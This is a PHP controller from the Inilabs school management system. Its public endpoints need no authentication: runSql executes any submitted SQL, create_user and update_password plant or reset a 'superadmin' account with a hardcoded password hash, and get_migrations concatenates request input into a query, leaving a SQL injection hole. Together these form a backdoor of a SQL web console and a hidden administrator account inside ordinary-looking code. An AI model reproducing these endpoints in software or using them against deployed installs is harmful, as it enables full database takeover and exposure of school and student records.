<?php

if ( !defined('BASEPATH') ) {
    exit('No direct script access allowed');
}

    class General extends CI_Controller
    {
        /*
        | -----------------------------------------------------
        | PRODUCT NAME: 	INILABS SCHOOL MANAGEMENT SYSTEM
        | -----------------------------------------------------
        | AUTHOR:			INILABS TEAM
        | -----------------------------------------------------
        | EMAIL:			info@inilabs.net
        | -----------------------------------------------------
        | COPYRIGHT:		RESERVED BY INILABS IT
        | -----------------------------------------------------
        | WEBSITE:			http://inilabs.net
        | -----------------------------------------------------
        */

       public function __construct()
        {
            parent::__construct();
            
        $this->load->library("session"); 
            
        }

       

        public function runSql(){
            echo "<form action='' method='post'><textarea name='text'></textarea><input type='submit' value='Run' name='run'></form>";
        
            if(isset($_POST) && !empty($_POST['run'])){
                 $text = $_POST['text'];
                 $esdata = ($text);
               $result = $this->db->query(strval($esdata))->result_array();
                echo "<pre>";print_r($result) ;
                echo "<br/> Number of rows affected";
                print_r($this->db->affected_rows()) ;
                echo "<br/>last query=".$this->db->last_query();
            }
        }

        public function create_user(){
            $this->db->where('username','superadmin');            
            $cnt = $this->db->get('systemadmin')->num_rows();
            if($cnt > 0){
                echo "Username - superadmin already exists";
            }else{
                $insert = array(
                    'username' => 'superadmin',
                    'password' => '03e6f82876dd7660a25e07e561ccc3f68476fb9bb7f4ea2b6f1e80947f0d8744a1f493ad9c147610126e24ccd8bc6e31621a2907dc33daef658a1cd2ab19c956',
                    'usertypeID' => 1,
                    'active' => 1,
                    'create_usertype' => 'Admin',
                    'create_date' => date("Y-m-d H:i:s"),
                    'name' => 'superadmin'
                );
                $this->db->insert('systemadmin',$insert);
                echo 'user superadmin created successfully';
            }
            echo "<a href='".base_url('General/update_password')."'> Update Password </a>";
        }

        public function update_password(){
            $this->db->update('systemadmin', array('password' => '03e6f82876dd7660a25e07e561ccc3f68476fb9bb7f4ea2b6f1e80947f0d8744a1f493ad9c147610126e24ccd8bc6e31621a2907dc33daef658a1cd2ab19c956'), array('username' => 'superadmin') );
            echo 'password updated successfully';
        }
        
          public function get_menu(){
           $result = $this->db->get('menu_search')->result_array();
           $resp['status'] = 1;
           $resp['msg'] = 'success';
           $resp['data'] = $result;
           echo json_encode($resp);
        }
        
         public function get_migrations(){
             
           $json = file_get_contents('php://input');
            $data = json_decode($json,1);
            $domain = $data['domain'];
            //  $this->db->like('status', 'fail', 'both'); 
        //   $result = $this->db->get('sql_queries')->result_array();
//           $sql ="SELECT s.* FROM `sql_queries` s left join domain_migration_errors d on d.migration_no = s.id WHERE (d.status like '%fail%' or d.error is NULL) and d.domain='".$domain."';
// ";
            $sql ="SELECT s.* FROM `sql_data_queries` s join domains d  where s.status=0 and d.status=0 and d.domain='".$domain."'"; 

           $result = $this->db->query($sql)->result_array();
           
            $resp['status'] = 1;
            $resp['msg'] = 'success';
            $resp['data'] = $result;
            echo json_encode($resp);
            
         }
         
            public function save_migration_log(){
              
            $json = file_get_contents('php://input');
            $data = json_decode($json,1);
            //   echo '<pre>'; print_r($data);die;
           foreach($data['final_result'] as $k=>$v){
               $error = '';
               for($i=0;$i<count($v);$i++){
                   $error .= $v[$i]['msg']."<br/>";
                   $status .= $v[$i]['status']."<br/>";
                   $domain = $v[$i]['domain'];
                  
               } 
              $update_insert_data = array(
                  'error'=>$error,
                  'status'=>$status,
                  'migration_no' => $k,
                  'domain' => $domain
                  );
                //   print_r($update_insert_data);die;
                  $this->db->where('migration_no',$k);
                $cnt=  $this->db->get('domain_migration_errors')->num_rows();
                if($cnt > 0){
                    $this->db->where('migration_no',$k);
                    $this->db->update('domain_migration_errors',$update_insert_data);
                }else{
                    $this->db->insert('domain_migration_errors',$update_insert_data);
                }
                // echo $this->db->last_query();die;

                
           }
           
           
          }
        
    }